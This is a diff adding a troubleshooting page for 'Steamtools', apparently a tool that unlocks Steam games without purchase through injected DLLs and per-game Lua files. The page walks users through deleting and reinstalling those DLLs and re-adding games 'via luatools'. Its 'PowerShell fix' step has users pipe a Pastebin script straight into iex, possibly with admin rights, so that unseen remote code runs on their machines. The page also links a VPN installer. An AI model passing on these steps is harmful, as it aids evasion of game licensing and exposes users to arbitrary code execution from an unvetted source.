@@ -1,0 +1,87 @@
+---
+## sidebar_position: 5
+---
+
+# Purchase Button in Steam
+
+The main reason for this happening is Steamtools being outdated. Steamtools is like any other program and should be updated regularly just in case.
+
+![PurchaseButtonExample](./img/purchase-button.png)
+
+---
+
+:::warning[Make sure to backup your files!]
+
+For safe practices it is a good idea to backup your files.
+```
+C:\Program Files (x86)\Steam\config\st-plugin
+C:\Program Files (x86)\Steam\config\depotcache
+```
+:::
+---
+## Option 1: Fresh reinstall
+### Make sure steam is closed fully (System Tray) before continuing.
+
+* Go to your Steam folder, usually `C:\Program Files (x86)\Steam`
+* Delete:
+
+  * `dwmapi.dll`
+  * `xinput1_4.dll`
+* Open PowerShell (Start menu or Win + R → `powershell`)
+* Paste the reinstall command for Steamtools
+
+If this doesn't work then you can try option 2 below.
+
+---
+
+## Option 2: Clem.la's fix
+Follow all steps and **check again after each one**.
+
+### 1. Restart Steam
+
+Fully close Steam including system tray, then reopen.
+
+---
+
+### 2. Check plugin folder
+
+```
+%ProgramFiles(x86)%\Steam\config\stplug-in
+```
+
+* Must exist
+* Must not be empty
+* Must contain a `.lua` file for each game
+
+If empty:
+
+* Go to each game's store page
+* Click **add via luatools**
+* Add all games again
+* Restart Steam
+
+---
+
+### 3. Run PowerShell fix
+
+Run PowerShell (admin may be required):
+
+```ps
+irm pastebin.com/raw/CR7JyVGs | iex
+```
+---
+
+### 4. Change account
+
+* Click your **profile (top right)**
+* Click **Change account**
+* Select your account again
+
+---
+
+### 5. Use VPN (Singapore)
+
+* [UrbanVPN](https://install.urban-vpn.com/UrbanVPN.exe)
+* [ProtonVPN](https://protonvpn.com/download)
+
+> Restart Steam after enabling VPN
